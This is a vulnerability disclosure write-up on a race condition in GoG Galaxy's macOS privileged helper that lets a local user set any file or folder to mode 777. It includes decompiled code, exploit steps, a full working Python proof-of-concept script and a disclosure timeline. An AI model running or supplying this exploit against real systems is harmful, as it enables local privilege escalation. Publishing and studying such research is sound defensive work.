
## Arbitrary Folder / File chmod 777 in GoG Galaxy 
The GoG Galaxy Application for MacOS has a race condition in its privileged helper service that allows an attacker  to chmod 777 an arbitrary folder / file. 

#### Discovering the Vulnerability 

One of the steps I take when I am auditing a privileged service on macOS that interacts with normal user processes, is to instrument the privileged service with `dtruss`. `dtruss` is similiar to `strace` on Linux, we can use it to print out syscall and other information for the instrumented process. 

After running `dtruss` on the privileged helper, I noticed that there was an interesting string that appeared. 

```
write(0x3, "2022-07-25 17:46:16.998 [Information][ (0)] [TID 0x70000f954000][client_service]: Received 'changeFolderPermissionsAtPath' request with path /Users/Shared/GOG.com/Galaxy.\n\0", 0xAB)		 = 171 0
```

This string seemed to suggest that the GoG Galaxy binary changes permissions of itself every time it is run. 

Looking at the GoG Galaxy application, we can see from the logs that the path  it tries to change the permissions of, is the same path the application is run from and is therefore attacker controllable.

GoG Galaxy running from `~/Desktop`
```
2022-07-30 23:54:12.177 [Information][ (0)] [TID 0x203832600][galaxy_client]: Requesting service to fix privileges for directory /Users/test/Desktop/GOG Galaxy.app
```

GoG Galaxy running from `/Applications/GOG Galaxy/`
```
2022-07-30 23:40:50.593 [Information][ (0)] [TID 0x202f41600][galaxy_client]: Requesting service to fix privileges for directory /Applications/GOG Galaxy.app
```

#### Application Side

Looking into the GoG Galaxy application, we can see that the string `changeFolderPermissionsAtPath` appears in the `galaxy::service_message_interchange::ClientServiceInterface::requestServiceToFixPrivileges` function. This function makes the XPC request to the helper. 

```objc
galaxy::service_message_interchange::ClientServiceInterface::requestServiceToFixPrivileges
          (ClientServiceInterface *this,basic_string *path)
{
  ServiceManager = [ClientServiceManager sharedManager];
  utf8_str = NSString* str = [NSString stringWithUTF8String:path];
  [ServiceManager changeFolderPermissionsAtPath:utf8_str];
  ...
  return
}
```

This function is called by `galaxy::service_message_interchange::ClientServiceInterface::fixPrivileges` which is listed below.

```objc
galaxy::service_message_interchange::ClientServiceInterface::fixPrivileges(ClientServiceInterface *this,basic_string *path)
{
  service_library::Logger::Info("Requesting service to fix privileges for directory {}",path);
  ClientServiceInterface* interface = this + 0x10;
  bool isClientServiceRunning = interface + 0x18;
  if(isClientServiceRunning)
  {
    ret_val = requestServiceToFixPrivileges(interface, path);
    return ret_val;
  }
  service_library::Logger::Info("Could not start {} while requesting service to fix privileges",
   (basic_string *)&galaxy::fundamentals::constants::clientServiceName);
  return 0;
}
```

`galaxy::service_message_interchange::ClientServiceInterface::fixPrivileges`  is called by `AppDelegate::applicationDidFinishLaunching` .This is run automatically when the application has started running its main loop, but before it has started processing any events.

```objc
void AppDelegate::applicationDidFinishLaunching:(ID param_1,SEL param_2,ID param_3)
{

  ...
  pInfo = [NSProcessInfo processInfo];
  args = [pInfo arguments];
  desc = [args description];
  path = [desc UTF8String];
  ...
  
  ...
  galaxy::service_message_interchange::ClientServiceInterface::fixPrivileges(ClientServiceInterface*client,path);
  ...

  ...
  shared_folder_path_str = [NSSTRING stringWithUTF8String:"/Users/Shared/GOG.com/Galaxy"];
  manager = [NSFileManager defaultManager];
  is_dir = 0;
  dir_exists = [manager fileExistsAtPath:path_str isDirectory:&is_dir];
  if(dir_exits)
  {
    galaxy::service_message_interchange::ClientServiceInterface::fixPrivileges(ClientServiceInterface*client,shared_folder_path_str);
  }
  ...
}


```

#### Privileged Helper Side

Looking into the `changeFolderPermissionsAtPath` function in the helper, we can see if the `checkAuthorization` function returns 0. The function will chmod the path without any additional checks.

``` objc 
changeFolderPermissionsAtPath(ID obj,SEL selector,NSString path)
{
  ...
  auth = [ClientService checkAuthorization:command:selector] 
  if(auth == 0)
  {
    NSString* files = NSFileManager.defaultManager().subpathsAtPath(path)
    utf8_path_string = [files UTF8String] 
    chmod(utf8_path_string, 0x1ff)
  }
  ...
}
```


#### Exploiting the Vulnerability 
To exploit the vulnerability we will need to win the race. The steps that we need to take are: 
1. Start the application. 
2. Run the application for long enough that the XPC message to chmod the folder is sent and verified and the function handler is executing.
3. Replace the contents of the folder that the application is running from with a symlink to the folder / file that we want to chmod. 

Steps 2 and 3 are where the race occurs. We need to run the application for long enough that the XPC message still gets sent and verified. However, not for so long that the contents of the folder / file is still the application when the chmod command runs.

To exploit the vulnerability we need to win the race. As the application does not crash and can be run an arbitrary amount of times, the correct timing needed to win the race can be brute forced.

First, we are going to work out the approximate time it takes for the application to run chmod on itself. To do this we do the following steps in a loop: 

Copy across a copy of the GoG application to `/tmp/`.
```python 
while True:
        shutil.copytree("/Applications/GOG Galaxy.app", "/tmp/GOG Galaxy.app")
```
Chmod it to be 755 and make our `/tmp/app_test` directory.
```python
        os.chmod("/tmp/GOG Galaxy.app", 0o755)
        os.mkdir("/tmp/app_test")
```
Run the application and sleep.
```python
        proc = Popen("/tmp/GOG Galaxy.app/Contents/MacOS/GOG Galaxy", stdin=PIPE, stdout=DEVNULL,stderr=STDOUT)
        time.sleep(initial_delay)
```
Rename the application folder to `/tmp/app_test`. We do this to avoid the helper changing the permissions of the folder to 777 after the application has quit.
```python
        os.rename("/tmp/GOG Galaxy.app", "/tmp/app_test")
```
Sleep the script and then kill the process we spawned.
```python
        time.sleep(0.1)
        time.sleep(initial_delay)
        proc.kill()
        time.sleep(0.1)
```
Clean up our `/tmp/app_test/` folder. If `/tmp/app_test` has been chmod'd to 777 then we are relatively close to the correct delay for the race condition to work, so we quit the loop.
```python
        status = os.stat("/tmp/app_test")
        mode_string = str(oct(status.st_mode)[-3:])
        shutil.rmtree("/tmp/app_test/")
        if mode_string == "777":       
                break
        initial_delay += 1
```
Print out the initial delay for debugging.
```python
print("initial delay is around {} seconds".format(initial_delay))
```

Now that we have our `initial_delay` value we can start attempts to exploit the vulnerability properly.

We are going to iterate over the range of (initial_delay-2, initial_delay+2) in 100ms steps. For each iteration we are going to:
```python
for i in range(initial_delay-2, initial_delay+2):
        for j in range(0, 10):
```
Copy across a copy of the GoG application to `/tmp/` and make our `/tmp/app_test` directory.
```python
                shutil.copytree("/Applications/GOG Galaxy.app", "/tmp/GOG Galaxy.app")
                os.mkdir("/tmp/app_test")
```
Run the application and sleep.
```python
                proc = Popen("/tmp/GOG Galaxy.app/Contents/MacOS/GOG Galaxy", stdin=PIPE, stdout=DEVNULL,stderr=STDOUT)
                delay = i + (j * 0.1)
                time.sleep(delay)
```
Rename the application folder and create a symlink to our target in its place.
```python
                os.rename("/tmp/GOG Galaxy.app", "/tmp/app_test")
                os.symlink(target, "/tmp/GOG Galaxy.app")
```
Kill the application.
```python
                time.sleep(0.1)
                proc.kill()
                time.sleep(0.1)
```
Clean up the folder and symlink we have made for this iteration.
```python
                shutil.rmtree("/tmp/app_test/")
                os.unlink("/tmp/GOG Galaxy.app")
```
Check if the vulnerability has trigged. If it has, we quit the loop and print out a statement.
```python
                status = os.stat(target)
                mode_string = str(oct(status.st_mode)[-3:])
                if mode_string == "777":
                        print("exploit succeeded - permisssions of {} changed to 777".format(target))
                        done = True
                        break
                print("time taken {} current mode of {} {}".format(delay,target,mode_string))
        if done:
                break
```

### Running the PoC 

Copy the following python script to `/tmp/` and run it with the first parameter being the folder / file that you want to chmod. eg., 

`python3 poc.py /Library/PrivilegedHelperTools`

If the code does not work you may need to change the `initial_delay` to be lower. The default value is based off the application running in a virtual machine so may be lower when running natively.

```python 
from subprocess import Popen, PIPE, STDOUT, DEVNULL
import os
import sys
import time
import shutil

target = sys.argv[1]
done = False
initial_delay = 15

print("computing initial delay")

while True:
        shutil.copytree("/Applications/GOG Galaxy.app", "/tmp/GOG Galaxy.app")
        os.chmod("/tmp/GOG Galaxy.app", 0o755)
        os.mkdir("/tmp/app_test")

        proc = Popen("/tmp/GOG Galaxy.app/Contents/MacOS/GOG Galaxy", stdin=PIPE, stdout=DEVNULL,stderr=STDOUT)
        time.sleep(initial_delay)
        os.rename("/tmp/GOG Galaxy.app", "/tmp/app_test")

        time.sleep(0.1)
        time.sleep(initial_delay)
        proc.kill()
        time.sleep(0.1)

        status = os.stat("/tmp/app_test")
        mode_string = str(oct(status.st_mode)[-3:])
        shutil.rmtree("/tmp/app_test/")
        if mode_string == "777":       
                break
        initial_delay += 1
        
print("initial delay is around {} seconds".format(initial_delay))

for i in range(initial_delay-2, initial_delay+2):
        for j in range(0, 10):
                shutil.copytree("/Applications/GOG Galaxy.app", "/tmp/GOG Galaxy.app")
                os.mkdir("/tmp/app_test")

                proc = Popen("/tmp/GOG Galaxy.app/Contents/MacOS/GOG Galaxy", stdin=PIPE, stdout=DEVNULL,stderr=STDOUT)

                delay = i + (j * 0.1)
                time.sleep(delay)

                os.rename("/tmp/GOG Galaxy.app", "/tmp/app_test")
                os.symlink(target, "/tmp/GOG Galaxy.app")

                time.sleep(0.1)
                proc.kill()
                time.sleep(0.1)

                shutil.rmtree("/tmp/app_test/")
                os.unlink("/tmp/GOG Galaxy.app")

                status = os.stat(target)
                mode_string = str(oct(status.st_mode)[-3:])

                if mode_string == "777":
                        print("exploit succeeded - permisssions of {} changed to 777".format(target))
                        done = True
                        break
                print("time taken {} current mode of {} {}".format(delay,target,mode_string))
        if done:
                break
```

##### Video of the Exploit Running 
The video is sped up 5x because the PoC took upwards of roughly 6 minutes to run in the virtual machine.

![image](/28_november_2023.webm)

### Disclosure Timeline 
- 18/11/2020 - First Contact 
- 16/01/2021 - First Response 
- 18/02/2021 - Still Working On Fix 
- 28/03/2021 - First Fix Release 
- 02/04/2021 - Response that says not all bugs are fixed 
- 03/04/2021 - Provided details on what isn't fixed 
- 05/05/2021 - Last Contact
- 28/11/2023 - Article Posted
